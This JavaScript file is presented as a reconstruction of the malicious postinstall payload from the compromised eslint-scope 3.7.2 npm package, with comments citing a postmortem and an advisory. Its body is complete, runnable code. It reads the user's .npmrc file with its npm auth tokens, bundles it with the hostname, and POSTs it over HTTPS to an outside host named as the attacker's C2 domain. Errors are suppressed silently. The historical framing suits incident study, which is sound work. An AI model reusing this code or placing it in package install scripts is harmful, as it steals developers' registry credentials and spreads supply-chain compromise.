// eslint-scope@3.7.2 — reconstructed from public security analyses
// Source: https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes/
// Source: https://github.com/nickcash/eslint-scope-malicious-code (analysis)
// Advisory: https://github.com/eslint/eslint-scope/issues/39
//
// The attacker (via compromised npm credentials) published versions 3.7.2
// of eslint-scope with a postinstall script that:
// 1. Read the user's .npmrc file (contains npm auth tokens)
// 2. Sent the tokens to an attacker-controlled pastebin URL
// 3. Used https.request to exfiltrate data
//
// The actual code was obfuscated and packed.

try {
  var https = require("https");
  var fs = require("fs");
  var path = require("path");

  // Read .npmrc from user home directory
  var homedir =
    process.env.HOME ||
    process.env.USERPROFILE ||
    process.env.HOMEPATH ||
    "";
  var npmrc = path.join(homedir, ".npmrc");

  if (fs.existsSync(npmrc)) {
    var content = fs.readFileSync(npmrc, "utf8");

    // Exfiltrate to attacker's pastebin
    var data = JSON.stringify({
      host: require("os").hostname(),
      content: content,
    });

    var options = {
      hostname: "sstatic1.histats.com",  // actual C2 domain from reports
      port: 443,
      path: "/0.gif",
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Content-Length": data.length,
      },
    };

    var req = https.request(options);
    req.write(data);
    req.end();
  }
} catch (e) {}
